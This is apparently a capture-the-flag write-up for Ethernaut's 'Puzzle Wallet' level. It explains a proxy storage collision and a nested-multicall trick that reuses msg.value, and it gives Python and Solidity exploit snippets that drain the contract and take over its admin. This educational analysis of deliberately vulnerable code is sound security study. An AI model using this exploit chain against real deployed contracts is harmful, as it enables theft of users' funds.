# 24) Puzzle Wallet

Success condition:
> Nowadays, paying for DeFi operations is impossible, fact.  
A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.  
They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.  
Little did they know, their lunch money was at risk…  
You'll need to hijack this wallet to become the admin of the proxy.

Here we need to become admin of the PuzzleProxy contract by changing the `admin` variable. No function allow us to change this without already being the admin. Since the contract use a Proxy pattern, the proxy contract and the implementation contract share their storage, so changing the variable in one of the contract will also change the variable in the corresponding slot in the other contract.We can see in the PuzzleWallet contract that the `maxBalance` variable is in the same slot (slot #1) as `admin` in the PuzzleProxy contract and the method `setMaxBalance()` allow us to change it:

```js
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted { // condition #1 need to be whitlisted
    require(address(this).balance == 0, "Contract balance is not 0");  // condition #2 contract balance need to be zero
    maxBalance = _maxBalance;
}
```

There is two condition that must be fullfiled for us to use this method.
First we must be whitelisted. To add ourselves in the whitelisted list we need to use the `addToWhitelist()` function:
```js
function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
}
```

To use that function we need to be owner of the PuzzleWallet contract. We can see that `owner` and `pendingAdmin` share the same slot (slot #0) and we can easily change the `pendingAdmin` variable with the `proposeNewAdmin()` function:
```js
function proposeNewAdmin(address _newAdmin) external {
    pendingAdmin = _newAdmin;
}
```

Changing the `pendingAdmin` variable in the proxy will change the `owner` variable of the PuzzleWallet contract. We can now use the `addToWhitelist()` function and whitelist ourself. The first condition to use `setMaxBalance()` is done.

Now for the second condition, we need to reduce the balance of the contract to zero :`require(address(this).balance == 0, "Contract balance is not 0");`.
`execute()` is the only method that can spend contract funds, but we can only spend the funds we have in our balances and the contract already has a balance that we can not access. We need to find a way to make the contract believe that we have a higher balance than what we have deposited on the contract. We will use the `multicall()` function for that:
```js
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success, ) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```
This function allow us to make several call in one transaction, we just need to pass as argument the different call we want to make.  
Ideally we would want to call `deposit()` several time with while sending a given `msg.value` so that the contract will increase our balances several times.
But we can see that the method have a measure to prevent us from calling `deposit()` several time and only provide `msg.value` once. If we send the deposit selector to the function, it will set `depositedCalled` to true, and the second time the function encounter the deposit selector, the require will failed the transaction. What we can do is call deposit once and then multicall again within the first multicall. That recursive multicall call will be able to call deposit once also. We can thus call deposit twice while only sending msg.value once in one transaction.

We need to encode the calldata parameter so that when we call `multicall()`, the function will call `deposit()` and then call `multicall()` again with a `deposit()` call.  
In Python:
```python
deposit_hash = Web3.keccak(text="deposit()")[:4].hex() # method id for the first deposit() call
multicall_deposit_calldata = instance.multicall.encode_input([deposit_hash]) # here we encode the calldata to call multicall with one argument, the deposit() call
data = [deposit_hash, multicall_deposit_calldata]  # we can now packed those two calldata together to have the final argument to give to multicall
```
In Solidity:
```js
bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
bytes[] memory deposit_sig_in_array = new bytes[](1);
deposit_sig_in_array[0] = deposit_sig;
bytes memory multicall_sig = abi.encodeWithSignature(
    "multicall(bytes[])",
    deposit_sig_in_array
);
bytes[] memory data = new bytes[](2);
data[0] = deposit_sig;
data[1] = multicall_sig;
wallet.multicall{value: address(this).balance}(data);
bytes memory transfer_sig = abi.encodeWithSignature(
    "transfer(int)",
    address(wallet).balance
);
```
We then call `multicall()`, providing the calldata we just created and the value equal to the balance of the contract. Since we we call deposit twice with this value, our user balance of the contract will be equal to the real total balance on the contract.
```python
instance.multicall(data, {"from": account, "value": wallet_balance})  # python
```
or
```js
wallet.multicall{value: address(this).balance}(data); // solidity
```

We now have a balance equal to the total funds of the contract, we can call `execute()` and spent the money however we want (we can send it to our own account). Now that the balance of the contract is 0, we can call `setMaxBalance()`, and change the admin of the contract.

We completed the level.


---
### Proxies
Although it is not possible to upgrade the code of your already deployed smart contract, it is possible to set-up a proxy contract architecture that will allow you to use new deployed contracts as if your main logic had been upgraded.

A proxy architecture pattern is such that all message calls go through a Proxy contract that will redirect them to the latest deployed contract logic. To upgrade, a new version of your contract is deployed, and the Proxy is updated to reference the new contract address.

When a function call to a contract is made that it does not support, the fallback function will be called. You can write a custom fallback function to handle such scenarios. The proxy contract uses a custom fallback function to redirect calls to other contract implementations.
Whenever a contract A delegates a call to another contract B, it executes the code of contract B in the context of contract A. This means that msg.value and msg.sender values will be kept and every storage modification will impact the storage of contract A.

[Proxy pattern](https://blog.openzeppelin.com/proxy-patterns/)
[Proxies on Openzeppelin](https://docs.openzeppelin.com/contracts/4.x/api/proxy)
[Old version of Proxies used for this level](https://docs.openzeppelin.com/contracts/3.x/api/proxy#UpgradeableProxy)
[EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)
[Transparent Proxy](https://blog.openzeppelin.com/the-transparent-proxy-pattern/)

### Delegate call

See challenges 6 Delegation and 16 Preservation

### Encode Calldata parameter

[Iamdefinitelyahuman on stackexchange](https://ethereum.stackexchange.com/questions/79505/what-is-a-good-alternative-to-contracttranslator-encode-abi)
[Brownie docs](https://eth-brownie.readthedocs.io/en/latest/api-network.html#ContractTx.encode_input)

---
## Level completed!

Next time, those friends will request an audit before depositing any money on a contract. Congrats!

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract.

Move on to the next level when you're ready!


